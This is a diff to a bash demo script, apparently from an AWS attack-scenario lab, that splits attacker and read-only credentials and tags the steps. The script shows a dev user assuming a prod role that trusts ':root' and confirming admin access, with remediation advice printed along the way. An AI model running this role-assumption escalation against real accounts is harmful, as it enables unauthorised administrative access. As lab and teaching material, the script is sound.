@@ -23,12 +23,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -68,6 +70,15 @@ if [ "$TARGET_ROLE_ARN" == "null" ] || [ -z "$TARGET_ROLE_ARN" ]; then
     exit 1
 fi
 
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw dev_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw dev_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
 # Get region
 AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
 
@@ -78,6 +89,7 @@ fi
 
 echo "Retrieved access key for: $STARTING_USER_DEV"
 echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo "Target Role ARN: $TARGET_ROLE_ARN"
 echo "Region: $AWS_REGION"
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
@@ -85,22 +97,29 @@ echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 # Navigate back to scenario directory
 cd - > /dev/null
 
-# Step 2: Configure AWS credentials with starting user in dev account
+# Credential switching helpers
+use_starting_creds() {
+    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
+    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
+# [EXPLOIT] Step 2: Configure AWS credentials with starting user in dev account
 echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials (dev account)${NC}"
-export AWS_ACCESS_KEY_ID=$STARTING_ACCESS_KEY_ID
-export AWS_SECRET_ACCESS_KEY=$STARTING_SECRET_ACCESS_KEY
+use_starting_creds
 export AWS_REGION=$AWS_REGION
-unset AWS_SESSION_TOKEN
 
 echo "Using region: $AWS_REGION"
 
 # Verify starting user identity
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
-show_cmd aws sts get-caller-identity --query 'Account' --output text
-DEV_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Current identity: $CURRENT_USER"
-echo "Dev Account ID: $DEV_ACCOUNT_ID"
 
 if [[ ! $CURRENT_USER == *"$STARTING_USER_DEV"* ]]; then
     echo -e "${RED}Error: Not running as $STARTING_USER_DEV${NC}"
@@ -108,13 +127,18 @@ if [[ ! $CURRENT_USER == *"$STARTING_USER_DEV"* ]]; then
 fi
 echo -e "${GREEN}✓ Verified starting user identity in dev account${NC}\n"
 
-# Step 3: Extract prod account ID from target role ARN
-echo -e "${YELLOW}Step 3: Identifying prod account${NC}"
+# [OBSERVATION] Step 3: Get dev account ID
+echo -e "${YELLOW}Step 3: Identifying dev and prod accounts${NC}"
+use_readonly_creds
+export AWS_REGION=$AWS_REGION
+show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
+DEV_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 PROD_ACCOUNT_ID=$(echo $TARGET_ROLE_ARN | cut -d':' -f5)
+echo "Dev Account ID: $DEV_ACCOUNT_ID"
 echo "Prod Account ID: $PROD_ACCOUNT_ID"
-echo -e "${GREEN}✓ Extracted prod account ID from target role ARN${NC}\n"
+echo -e "${GREEN}✓ Extracted account IDs${NC}\n"
 
-# Step 4: Display trust policy information - CRITICAL SECURITY ISSUE
+# [OBSERVATION] Step 4: Display trust policy information - CRITICAL SECURITY ISSUE
 echo -e "${YELLOW}Step 4: Examining trust policy of target role${NC}"
 echo -e "${RED}⚠️  CRITICAL SECURITY ISSUE IDENTIFIED ⚠️${NC}"
 echo ""
@@ -135,10 +159,12 @@ echo "  • Use aws:PrincipalArn or aws:PrincipalOrgID conditions"
 echo ""
 echo -e "${GREEN}✓ Trust policy analyzed${NC}\n"
 
-# Step 5: Verify lack of admin access in prod account
+# [EXPLOIT] Step 5: Verify lack of admin access in prod account
 echo -e "${YELLOW}Step 5: Verifying we don't have admin access in prod yet${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "Attempting to list IAM users in prod account (should fail)..."
-show_cmd aws iam list-users --max-items 1
+show_cmd "Attacker" "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
 else
@@ -146,14 +172,16 @@ else
 fi
 echo ""
 
-# Step 6: Assume the prod target role
+# [EXPLOIT] Step 6: Assume the prod target role
 echo -e "${YELLOW}Step 6: Assuming the target role in prod account${NC}"
+use_starting_creds
+export AWS_REGION=$AWS_REGION
 echo "Target Role ARN: $TARGET_ROLE_ARN"
 echo ""
 echo "Because the role trusts :root, we can assume it with our basic user credentials..."
 echo ""
 
-show_attack_cmd aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name root-trust-demo-session --query 'Credentials' --output json
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn $TARGET_ROLE_ARN --role-session-name root-trust-demo-session --query 'Credentials' --output json"
 CREDENTIALS=$(aws sts assume-role \
     --role-arn $TARGET_ROLE_ARN \
     --role-session-name root-trust-demo-session \
@@ -167,9 +195,9 @@ export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
 export AWS_REGION=$AWS_REGION
 
 # Verify we assumed the role
-show_cmd aws sts get-caller-identity --query 'Arn' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
 ROLE_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
-show_cmd aws sts get-caller-identity --query 'Account' --output text
+show_cmd "Attacker" "aws sts get-caller-identity --query 'Account' --output text"
 CURRENT_ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Current identity: $ROLE_IDENTITY"
 echo "Current Account ID: $CURRENT_ACCOUNT_ID"
@@ -186,11 +214,11 @@ fi
 
 echo -e "${GREEN}✓ Successfully assumed role in prod account${NC}\n"
 
-# Step 7: Verify administrator access in prod account
+# [OBSERVATION] Step 7: Verify administrator access in prod account
 echo -e "${YELLOW}Step 7: Verifying administrator access in prod account${NC}"
 echo "Attempting to list IAM users..."
 
-show_cmd aws iam list-users --max-items 3 --output table
+show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
 if aws iam list-users --max-items 3 --output table; then
     echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
     echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED IN PROD ACCOUNT${NC}"
